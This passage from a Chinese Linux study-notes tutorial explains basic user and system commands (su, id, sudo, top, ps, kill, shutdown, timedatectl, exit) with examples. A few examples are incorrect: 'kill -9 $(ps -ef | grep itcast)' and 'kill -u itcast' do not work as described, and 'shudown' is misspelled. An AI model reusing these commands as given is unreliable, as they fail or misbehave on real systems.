src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576054831537.png" alt="1576054831537"></p><p>切换到root</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">su root<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576054846742.png" alt="1576054846742"></p><p>这样的话，我们就进入到了root用户下。</p><h3 id="2-3-4-id命令">2.3.4 id命令</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">我们如果需要查看当前账号详细信息的时候，比如查看它的用户<span class="hljs-built_in">id</span>、群组<span class="hljs-built_in">id</span>以及所属组的时候，我们就可以使用<span class="hljs-built_in">id</span>命令进行查看<br></code></pre></td></tr></table></figure><p>id命令用于显示用户的ID，以及所属群组的ID。</p><p>id会显示用户以及所属群组的实际与有效ID。若两个ID相同，则仅显示实际ID。若仅指定用户名称，则显示目前用户的ID。</p><p>使用者权限：所有用户</p><p><strong>语法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">id <span class="hljs-selector-attr">[-gGnru]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[用户名称]</span><br></code></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>-g或–group 　显示用户所属群组的ID。</p></li><li class="lvl-2"><p>-G或–groups 　显示用户所属附加群组的ID。</p></li><li class="lvl-2"><p>-n或–name 　显示用户，所属群组或附加群组的名称。</p></li><li class="lvl-2"><p>-r或–real 　显示实际ID。</p></li><li class="lvl-2"><p>-u或–user 　显示用户ID。</p></li><li class="lvl-2"><p>-help 　显示帮助。</p></li><li class="lvl-2"><p>-version 　显示版本信息。</p></li></ul><p><strong>显示当前用户信息</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">id<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576578213110.png" alt="1576578213110"></p><blockquote><p>总结</p><p>id命令参数虽然很多</p><p>但是常用的也就是id命令，不带参数的</p><p>主要看他的uid和组信息</p></blockquote><h3 id="2-3-5-sudo执行">2.3.5 sudo执行</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">比如我们使用普通用户操作用户或者操作用户组、以及修改网卡配置文件的时候，需要切换<span class="hljs-built_in">到root</span>用户才操作，此时我们可以使用sudo命令提高普通用户的操作权限，以达到操作目的<br></code></pre></td></tr></table></figure><p>sudo:控制用户对系统命令的使用权限,root允许的操作。</p><p>通过sudo可以提高普通用户的操作权限</p><p>使用者权限：普通用户</p><p><strong>语法如下：</strong></p><p>sudo -V<br>sudo -h<br>sudo -l<br>sudo -v<br>sudo -k<br>sudo -s<br>sudo -H<br>sudo [ -b ] [ -p prompt ] [ -u username/#uid] -s<br>sudo command</p><p><strong>参数说明</strong>：</p><ul class="lvl-0"><li class="lvl-2"><p>-V 显示版本编号</p></li><li class="lvl-2"><p>-h 会显示版本编号及指令的使用方式说明</p></li><li class="lvl-2"><p>-l 显示出自己（执行 sudo 的使用者）的权限</p></li><li class="lvl-2"><p>-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</p></li><li class="lvl-2"><p>-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</p></li><li class="lvl-2"><p>-b 将要执行的指令放在背景执行</p></li><li class="lvl-2"><p>-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</p></li><li class="lvl-2"><p>-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）</p></li><li class="lvl-2"><p>-s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell</p></li><li class="lvl-2"><p>-H 将环境变数中的 HOME 指定为要变更身份的使用者HOME目录（如不加 -u 参数就是系统管理者 root ）</p></li><li class="lvl-2"><p>command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</p></li></ul><p>sudo命令使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ls<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576056341831.png" alt="1576056341831"></p><p>指定root用户执行指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -u root ls -l<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576056180063.png" alt="1576056180063"></p><p><strong>修改网卡配置文件</strong></p><p>比如，在下面的例子中，我们使用普通用户修改网卡的配置文件，在进行保存的时候，提示我们【无法打开并写入文件】，那么此时，我们可以通过sudo命令来提升自己的写入权限</p><p>执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi /etc/sysconfig/network-scripts/ifcfg-ens33 <br></code></pre></td></tr></table></figure><p>执行效果如下（保存）</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576494207598.png" alt="1576494207598"></p><p>然后点击回车</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576493914410.png" alt="1576493914410"></p><p>那么我们在修改上面的 命令，使用sudo进行修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo   vi /etc/sysconfig/network-scripts/ifcfg-ens33 <br></code></pre></td></tr></table></figure><p>执行效果如下（键入itcast密码）</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576494108199.png" alt="1576494108199"></p><p>执行保存</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576494276066.png" alt="1576494276066"></p><p>我们发现此时就不在报错了</p><h3 id="2-3-6-top命令">2.3.6 top命令</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在企业级开发中，开发人员（运维人员也会经常使用）常常为了查看服务器上运行的程序占用的<span class="hljs-meta">CPU</span>情况以及占用内存情况，目的就是检测我们的程序是否在正常范围内运行<br></code></pre></td></tr></table></figure><p>top命令用于实时显示 process 的动态。</p><p>使用权限：所有使用者。</p><p><strong>显示进程信息</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">top<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576495173035.png" alt="1576495173035"></p><p><strong>各进程（任务）的状态监控属性解释说明：</strong><br>PID — 进程id<br>USER — 进程所有者<br>PR — 进程优先级<br>NI — nice值。负值表示高优先级，正值表示低优先级<br>VIRT — 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES<br>RES — 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA<br>SHR — 共享内存大小，单位kb<br>S — 进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程<br>%CPU — 上次更新到现在的CPU时间占用百分比<br>%MEM — 进程使用的物理内存百分比<br>TIME+ — 进程使用的CPU时间总计，单位1/100秒<br>COMMAND — 进程名称（命令名/命令行）</p><p><strong>显示完整命令，与top命令不同的就是command属性像是进行了命令补全</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">top -c<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576544383182.png" alt="1576544383182"></p><p><strong>显示指定的进程信息，以下显示进程号为6972的进程信息，CPU、内存占用率等</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">top -p 6972<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576544720729.png" alt="1576544720729"></p><blockquote><p>top命令的用法很多</p><p>但是常用的就是top（不带参数），有的时候，在进程比较多的时候，我们常常记住进程的pid，然后通过top -p pid进行查看</p><p>也就是说，top+ top -p是经常被用到的</p></blockquote><h3 id="2-3-7-ps命令">2.3.7 ps命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span>命令类似于我们在Windows中通过任务管理器查看进程信息<br></code></pre></td></tr></table></figure><p>Linux ps命令用于显示当前进程 (process) 的状态信息</p><p>使用者权限：所有用户</p><p><strong>语法如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps <br></code></pre></td></tr></table></figure><p>显示进程信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -A <br></code></pre></td></tr></table></figure><p>显示指定用户信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> <span class="hljs-literal">-u</span> itcast<br></code></pre></td></tr></table></figure><p>显示所有进程信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -ef <br></code></pre></td></tr></table></figure><h3 id="2-3-8-kill命令">2.3.8 kill命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">引子：<br>前面，我们刚刚学习完了Windows上开发，比如，我们经常遇到的要给问题就是，我们需要经常的启动或者重启tomcat，有的时候会报端口冲突，这个时候，我们可能就去Windows的任务管理器中去结束这个进程<br>那么在Linux中我们可以通过<span class="hljs-built_in">kill</span>命令来实现Windwos上手工结束进程的操作<br></code></pre></td></tr></table></figure><p>Linux kill命令用于删除执行中的程序或工作(可强制中断)</p><p>使用者权限：所有用户</p><p><strong>语法如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kill [-s &lt;信息名称或编号&gt;][程序]　或　kill [-l &lt;信息编号&gt;]<br></code></pre></td></tr></table></figure><p><strong>参数说明</strong>：</p><ul class="lvl-0"><li class="lvl-2"><p>-l &lt;信息编号&gt; 　若不加&lt;信息编号&gt;选项，则-l参数会列出全部的信息名称。</p></li><li class="lvl-2"><p>-s &lt;信息名称或编号&gt; 　指定要送出的信息。</p></li><li class="lvl-2"><p>[程序] 　[程序]可以是程序的PID或是PGID，也可以是工作编号。</p></li></ul><p>杀死一个进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kill 15642<br></code></pre></td></tr></table></figure><p>强制杀死进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kill -KILL 15642<br></code></pre></td></tr></table></figure><p>彻底杀死进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kill -9 15642<br></code></pre></td></tr></table></figure><p>杀死指定用户所有进程</p><p>1.方法一 过滤出itcast用户进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kill -9 $(ps -ef | grep itcast) <br></code></pre></td></tr></table></figure><p>2.方法二，直接杀死</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kill -u itcast<br></code></pre></td></tr></table></figure><blockquote><p>注意</p><p>上面列举了很多kill进程的命令</p><p>但是我们我们常用的就是kill -9命令，我们常常找到进程的pid</p><p>然后通过kill -9进行杀死进程</p></blockquote><h3 id="2-3-9-关机命令">2.3.9 关机命令</h3><p>shutdown命令可以用来进行关闭系统，并且在关机以前传送讯息给所有使用者正在执行的程序，shutdown 也可以用来重开机</p><p>使用者权限：管理员用户</p><p><strong>语法如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">shutdown [-t seconds] [-rkhncfF] time [message]<br></code></pre></td></tr></table></figure><p><strong>参数说明</strong>：</p><ul class="lvl-0"><li class="lvl-2"><p>-t seconds : 设定在几秒钟之后进行关机程序。</p></li><li class="lvl-2"><p>-k : 并不会真的关机，只是将警告讯息传送给所有使用者。</p></li><li class="lvl-2"><p>-r : 关机后重新开机。</p></li><li class="lvl-2"><p>-h : 关机后停机。</p></li><li class="lvl-2"><p>-n : 不采用正常程序来关机，用强迫的方式杀掉所有执行中的程序后自行关机。</p></li><li class="lvl-2"><p>-c : 取消目前已经进行中的关机动作。</p></li><li class="lvl-2"><p>-f : 关机时，不做 fcsk 动作(检查 Linux 档系统)。</p></li><li class="lvl-2"><p>-F : 关机时，强迫进行 fsck 动作。</p></li><li class="lvl-2"><p>time : 设定关机的时间。</p></li><li class="lvl-2"><p>message : 传送给所有使用者的警告讯息。</p></li></ul><p>立即关机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">shutdown -h now<br>或者<br>shudown<br></code></pre></td></tr></table></figure><p>指定1分钟后关机，1分钟关机并显示警告信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">shutdown +1 “System will shutdown after 1 minutes” <br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576059932470.png" alt="1576059932470"></p><p>指定1分钟后重启，并发出警告信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">shutdown –r +1 “1分钟后关机重启”<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576060232485.png" alt="1576060232485"></p><h3 id="2-3-10-重启命令">2.3.10 重启命令</h3><p>reboot命令用于用来重新启动计算机</p><p>使用者权限：管理员、普通（需要验证）用户</p><p><strong>语法如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">reboot [-n] [-w] [-d] [-f] [-i]<br></code></pre></td></tr></table></figure><p><strong>参数</strong>：</p><ul class="lvl-0"><li class="lvl-2"><p>-n : 在重开机前不做将记忆体资料写回硬盘的动作</p></li><li class="lvl-2"><p>-w : 并不会真的重开机，只是把记录写到 /var/log/wtmp 档案里</p></li><li class="lvl-2"><p>-d : 不把记录写到 /var/log/wtmp 档案里（-n 这个参数包含了 -d）</p></li><li class="lvl-2"><p>-f : 强迫重开机，不呼叫 shutdown 这个指令</p></li><li class="lvl-2"><p>-i : 在重开机之前先把所有网络相关的装置先停止</p></li></ul><p>开始重新启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">reboot<br></code></pre></td></tr></table></figure><p>重启效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576136722927.png" alt="1576136722927"></p><p>此时我们的虚拟机正在重启**（别忘记使用root用户执行）**</p><h3 id="2-3-11-who命令">2.3.11 who命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">在企业级开发过程中，我们使用<span class="hljs-built_in">who</span>命令的时候常常需要快速重启服务器，在重启之前需要检测下有没有终端在连接（处理程序），如果有，可能就不会重启（会私下询问何时弄完，弄完后在重启），如果没有其他人连接，将执行快速重启<br></code></pre></td></tr></table></figure><p>who命令用于显示系统中有哪些使用者正在上面，显示的资料包含了使用者 ID、使用的终端机、从哪边连上来的、上线时间、呆滞时间、CPU 使用量、动作等等</p><p>使用者权限：所有使用者都可使用。</p><p><strong>语法如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">who - [husfV] [user]<br></code></pre></td></tr></table></figure><p><strong>参数说明</strong>：</p><ul class="lvl-0"><li class="lvl-2"><p>-H 或 --heading：显示各栏位的标题信息列；</p></li><li class="lvl-2"><p>-i 或 -u 或 --idle：显示闲置时间，若该用户在前一分钟之内有进行任何动作，将标示成&quot;.&quot;号，如果该用户已超过24小时没有任何动作，则标示出&quot;old&quot;字符串；</p></li><li class="lvl-2"><p>-m：此参数的效果和指定&quot;am i&quot;字符串相同；</p></li><li class="lvl-2"><p>-q 或–count：只显示登入系统的帐号名称和总人数；</p></li><li class="lvl-2"><p>-s：此参数将忽略不予处理，仅负责解决who指令其他版本的兼容性问题；</p></li><li class="lvl-2"><p>-w 或-T或–mesg或–message或–writable：显示用户的信息状态栏；</p></li><li class="lvl-2"><p>–help：在线帮助；</p></li><li class="lvl-2"><p>–version：显示版本信息</p></li></ul><p>显示当前登录系统的用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">who<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576143161044.png" alt="1576143161044"></p><p>显示明细(标题)信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">who -H<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576143218612.png" alt="1576143218612"></p><p>由上图可知，截止到现在只有itcast在线。</p><h3 id="2-3-12-timedatectl命令">2.3.12 timedatectl命令</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">引子：<br>timedatectl是用于控制系统时间和日期。可以用来查询和更改系统时钟于设定，同时可以设定和修改时区信息。<br><br>在实际开发过程中，系统时间的显示会和实际出现不同步；我们一般为了校正服务器时间、时区的时候会使用timedatectl命令<br></code></pre></td></tr></table></figure><p>使用者权限：所有使用者都可使用，设置时间需要管理员，下面会标注。</p><p>几个常见的概念，进行总结如下：</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576550880532.png" alt="1576550880532"></p><p><strong>显示系统的当前时间和日期，使用命令行中的timedatectl命令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">timedatectl status<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576147390352.png" alt="1576147390352"></p><p>在上面的示例中，分别显示时区、CST时间和UTC时间，其中,RTC time就是硬件时钟的时间，硬件时间默认为UTC。</p><p><strong>查看当前时区</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">timedatectl | grep Time<br>或者<br>timedatectl <br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576147504533.png" alt="1576147504533"></p><p>上图显示中国时区</p><p><strong>查看所有可用的时区</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">timedatectl list-timezones</span><br></code></pre></td></tr></table></figure><p>执行效果如下（下面数据没有截全）</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576147567622.png" alt="1576147567622"></p><p><strong>设置本地时区</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">timedatectl set-timezone &quot;Asia/Shanghai&quot;<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576147666007.png" alt="1576147666007"></p><p><strong>禁用时间同步（使用管理员账户）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">timedatectl set-ntp false<br>在执行<br>timedatectl set-time &quot;2019-03-11 20:45:00&quot;<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576148429123.png" alt="1576148429123"></p><blockquote><p>注意: 如果ntp时间同步为true时无法修改时间设定，下面马上介绍</p></blockquote><p><strong>打开ntp</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">timedatectl set-ntp true<br>在执行<br>timedatectl set-time &quot;2019-03-11 20:45:00&quot;<br></code></pre></td></tr></table></figure><p>执行效果如下（ntp时间同步为true时无法修改时间设定）</p><p>报错信息 如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576226884267.png" alt="1576226884267"></p><p><strong>启用时间同步</strong></p><p>NTP即Network Time Protocol（网络时间协议），是一个互联网协议，用于同步计算机之间的系统时钟。timedatectl实用程序可以自动同步你的Linux系统时钟到使用NTP的远程服务器。</p><p>要开始自动时间同步到远程NTP服务器，在终端键入以下命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">timedatectl set-ntp true<br></code></pre></td></tr></table></figure><p>比如，在上面我们使用timedatectl set-time “2019-03-11 20:45:00”，如下图</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576229638059.png" alt="1576229638059"></p><p>此时我们执行timedatectl set-ntp true，发现时间正常同步过来了如下图</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576229679265.png" alt="1576229679265"></p><p>要禁用NTP时间同步，在终端键入以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">timedatectl set-ntp false<br></code></pre></td></tr></table></figure><p>执行上面的 命令即可关闭ntp</p><blockquote><p>总结</p><p>在实际使用过程中</p><p>我们经常使用timedatectl进行时区、CST、UTC的设置</p></blockquote><h3 id="2-3-13-clear命令">2.3.13 clear命令</h3><p>clear命令用于清除屏幕</p><p>使用者权限：所有使用者都可使用。</p><p><strong>语法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clear<br></code></pre></td></tr></table></figure><p>执行clear前</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576230100277.png" alt="1576230100277"></p><p>执行clear后</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576230123895.png" alt="1576230123895"></p><p>通过执行clear命令，就可以把缓冲区的命令全部清理干净了</p><h3 id="2-3-14-exit命令"><strong>2.3.14 exit命令</strong></h3><p>exit命令用于退出目前的shell。</p><p>执行exit可使shell以指定的状态值退出。若不设置状态值参数，则shell以预设值退出。状态值0代表执行成功，其他值代表执行失败。exit也可用在script，离开正在执行的script，回到shell。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">退出码（<span class="hljs-keyword">exit</span> status，或<span class="hljs-keyword">exit</span> code）的约定：<br><br><span class="hljs-number">0</span>表示成功（Zero - Success）<br><br>非<span class="hljs-number">0</span>表示失败（Non-Zero  - Failure）<br><br><span class="hljs-number">2</span>表示用法不当（Incorrect Usage）<br><br><span class="hljs-number">127</span>表示命令没有找到（Command Not Found）<br><br><span class="hljs-number">126</span>表示不是可执行的（Not an executable）<br><br>&gt;=<span class="hljs-number">128</span> 信号产生<br></code></pre></td></tr></table></figure><p><strong>语法如下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">exit [状态值]<br></code></pre></td></tr></table></figure><p>退出终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">exit</span></span><br></code></pre></td></tr></table></figure><blockquote><p>exit会被经常在shell中使用</p><p>我们在明天的课程【综合案例】中会使用到exit</p></blockquote><h2 id="2-4-总结">2.4 总结</h2><p>用户账号管理和用户组是我们在实际使用过程中常用的命令，学习完创建账号、创建组后，需要通过gpasswd命令将用户添加到组，这也是我们学习的最终目的</p><p>系统管理的常用命令都是在开发过程中经常使用到的</p><h1>3 Linux目录管理</h1><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">注意：</span><br><span class="hljs-attr">在下面的讲解中，每个命令都有很多的参数说明（选项），我们只讲其中的几个，关键是让学生掌握命令的语法；学生学习完语法后，就可以自己按照参数书写各种命令，这也是我们最终的目的。常用命令，我们在企业级开发过程中，经常书写的命令。会非常被容易记住，不常用的命令，只要我们学习完了语法之后，在去查找参数手册，会非常容易的解决我们的问题，所以，每个命令不是建立在死记硬背的基础上的，要理解语法+查找参数</span>=<span class="hljs-string">解决问题</span><br></code></pre></td></tr></table></figure><h2 id="3-1-Linux-文件与目录管理">3.1 Linux 文件与目录管理</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">在Linux系统中，所有的的目录结构为树状结构，最顶级的目录为根目录 /。<br>在实际开发过程中，文件的操作是非常频繁也是非常重要的<br>下面的章节我们将学习下Linux系统所有的系统目录和文件通过命令是如何进行管理的 <br></code></pre></td></tr></table></figure><h3 id="3-1-1-目录常用命令">3.1.1 目录常用命令</h3><ul class="lvl-0"><li class="lvl-2"><p>ls:         列出目录</p></li><li class="lvl-2"><p>cd：     切换目录</p></li><li class="lvl-2"><p>pwd：  显示目前的目录</p></li><li class="lvl-2"><p>mkdir：创建一个新的目录</p></li><li class="lvl-2"><p>rmdir：删除一个空的目录</p></li><li class="lvl-2"><p>cp:         复制文件或目录</p></li><li class="lvl-2"><p>rm:        移除文件或目录</p></li><li class="lvl-2"><p>mv:        移动文件与目录或修改文件与目录的名称</p></li></ul><p><strong>自动补全</strong></p><ul class="lvl-0"><li class="lvl-2"><p>在敲出 文件/ 目录 / 命令 的前几个字母之后, 按下 <code>tab</code>键</p></li><li class="lvl-2"><p>如果还存在其他 文件 / 目录 / 命令, 再按一下tab键, 系统会提示可能存在的命令</p></li></ul><h4 id="1-ls-列出目录">1) ls (列出目录)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>命令相当于我们在Windows系统中打开磁盘、或者打开文件夹看到的目录以及文件的明细，如下图<br></code></pre></td></tr></table></figure><p>【查看磁盘下的目录与文件】</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576564124577.png" alt="1576564124577"></p><p>【查看文件夹下的目录与文件】</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576564161701.png" alt="1576564161701"></p><p>注意：在Linux系统当中， ls 